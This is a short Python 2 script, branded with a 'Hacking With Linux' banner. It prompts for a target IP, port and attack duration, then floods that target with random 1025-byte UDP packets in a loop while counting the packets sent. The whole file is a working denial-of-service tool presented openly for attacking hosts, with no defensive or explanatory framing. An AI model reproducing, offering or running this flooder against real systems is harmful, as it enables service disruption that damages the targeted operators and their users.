#!/usr/bin/env python

# -*- coding: utf-8 -*-



import os

import sys

import time

import random

import socket



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1025)



gray = "\033[0;37m";

white = "\033[1;37m"

red = "\033[1;31m";

green = "\033[1;32m";

os.system('clear')



intro = ('''



\t ______ __         ______               ______

\t|    __|  |_.----.|__    |.-----.-----.|__    |.----.

\t|__    |   _|   _||__    ||__ --|__ --||__    ||   _|

\t|______|____|__|  |______||_____|_____||______||__|

\t                              By Hacking With Linux

\t         https://www.youtube.com/c/HACKINGWITHLINUX

''')





print(green + intro)



ip = raw_input (green + " [~] " + white + "Enter target IP $ ")

port = input (green + " [~] " + white + "Enter target Port $ ")

dur = input (green + " [~] " + white + "Enter duration of Attack (in seconds i.e 60) $ ")

timeout = time.time() + dur

sent = 0



while True:

	try:

		if time.time() > timeout:

			break

		else:

			sock.sendto(bytes, (ip, port))

			sent = sent + 1

			print (green + "[!]" + white + " Sent " + str(sent) + " Packages to " + ip + " at Port " + str(port))

	except KeyboardInterrupt:

		break

